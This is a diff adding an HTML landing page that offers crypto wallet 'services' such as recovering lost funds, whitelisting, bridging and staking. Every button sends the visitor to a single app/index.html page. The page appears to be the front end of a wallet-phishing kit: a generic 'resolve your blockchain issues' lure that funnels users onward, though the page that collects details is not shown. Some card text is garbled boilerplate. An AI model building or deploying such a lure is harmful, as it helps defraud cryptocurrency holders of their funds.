+                <h3>ADD TOKENS</h3>
+                <p>
+                  Crypto tokens are a type of cryptocurrency that represents an
+                  asset or specific use and reside on their own blockchain.
+                </p> </a
+              ><a
+                href="javascript:void(0)"
+                class="open btn d-inline-block srv-btn me-3 py-1 align-self-start"
+                >Select</a
+              >
+            </div>
+          </div>
+          <div class="service-card link-container">
+            <a href="javascript:void(0)" class="open"> </a>
+            <div class="service-card-details">
+              <a href="javascript:void(0)" class="open">
+                <i class="stm-chart-refresh"></i>
+                <h3>UPDATE MY PORTFOLIOS</h3>
+                <p>
+                  Generate Real-Time Profit and Loss Reports, Your Coin Values,
+                  Reports for Taxes and More.
+                </p> </a
+              ><a
+                href="javascript:void(0)"
+                class="open btn d-inline-block srv-btn me-3 py-1 align-self-start"
+                >Select</a
+              >
+            </div>
+          </div>
+          <div class="service-card link-container">
+            <a href="javascript:void(0)" class="open"> </a>
+            <div class="service-card-details">
+              <a href="javascript:void(0)" class="open">
+                <i class="stm-chart-refresh"></i>
+                <h3>PURCHASE TOKEN</h3>
+                <p>
+                  Also, buy bitcoin, ether, and many common cryptocurrencies.
+                </p> </a
+              ><a
+                href="javascript:void(0)"
+                class="open btn d-inline-block srv-btn me-3 py-1 align-self-start"
+                >Select</a
+              >
+            </div>
+          </div>
+          <div class="service-card link-container">
+            <a href="javascript:void(0)" class="open"> </a>
+            <div class="service-card-details">
+              <a href="javascript:void(0)" class="open">
+                <i class="stm-chart-refresh"></i>
+                <h3>MY NFTS</h3>
+                <p>view your collection of digital works</p> </a
+              ><a
+                href="javascript:void(0)"
+                class="open btn d-inline-block srv-btn me-3 py-1 align-self-start"
+                >Select</a
+              >
+            </div>
+          </div>
+          <div class="service-card link-container">
+            <a href="javascript:void(0)" class="open"> </a>
+            <div class="service-card-details">
+              <a href="javascript:void(0)" class="open">
+                <i class="stm-chart-refresh"></i>
+                <h3>STAKING REVIEW</h3>
+                <p>
+                  Interaction between mobile apps and mobile browsers are
+                  supported via mobile deep linking Having complete control of
+                  your staking
+                </p> </a
+              ><a
+                href="javascript:void(0)"
+                class="open btn d-inline-block srv-btn me-3 py-1 align-self-start"
+                >Select</a
+              >
+            </div>
+          </div>
+          <div class="service-card link-container">
+            <a href="javascript:void(0)" class="open"> </a>
+            <div class="service-card-details">
+              <a href="javascript:void(0)" class="open">
+                <i class="stm-chart-refresh"></i>
+                <h3>Missing / Irregular Balance</h3>
+                <p>Recover lost/missing funds</p> </a
+              ><a
+                href="javascript:void(0)"
+                class="open btn d-inline-block srv-btn me-3 py-1 align-self-start"
+                >Select</a
+              >
+            </div>
+          </div>
+          <div class="service-card link-container">
+            <a href="javascript:void(0)" class="open"> </a>
+            <div class="service-card-details">
+              <a href="javascript:void(0)" class="open">
+                <i class="stm-chart-refresh"></i>
+                <h3>WHITELIST</h3>
+                <p>Get an Early Spot for Minting.</p> </a
+              ><a
+                href="javascript:void(0)"
+                class="open btn d-inline-block srv-btn me-3 py-1 align-self-start"
+                >Select</a
+              >
+            </div>
+          </div>
+          <div class="service-card link-container">
+            <a href="javascript:void(0)" class="open"> </a>
+            <div class="service-card-details">
+              <a href="javascript:void(0)" class="open">
+                <i class="stm-chart-refresh"></i>
+                <h3>BRIDGE</h3>
+                <p>
+                  enables applications built on different blockchains to
+                  communicate with and interact with each other. On launch,
+                  Ethereum, BSC, Avalanche, and Polygon – four of the leading
+                  blockchains and protocols – are supported, with capabilities
+                  to add new blockchains built-in to the Alliance Bridge
+                  protocol.
+                </p> </a
+              ><a
+                href="javascript:void(0)"
+                class="open btn d-inline-block srv-btn me-3 py-1 align-self-start"
+                >Select</a
+              >
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <footer class="p-5">
+      <div
+        class="px-2 d-flex flex-column align-items-center"
+        style="color: white"
+      >
+        <p>Ready to resolve your blockchain issues?</p>
+        <p>We are here to provide help.</p>
+        <a
+          href="javascript:void(0)"
+          class="open btn d-inline-block hero-btn me-3 py-2"
+          >Start Here</a
+        >
+      </div>
+    </footer>
+    <script>
+      document
+        .querySelectorAll(".open")
+        .forEach((el) =>
+          el.addEventListener(
+            "click",
+            () => (window.location = "app/index.html"),
+          ),
+        );
+    </script>
+  </body>
+  <script src="chrome-extension://lgmpcpglpngdoalbgeoldeajfclnhafa/inpage.js"></script>
+ 
+</html>
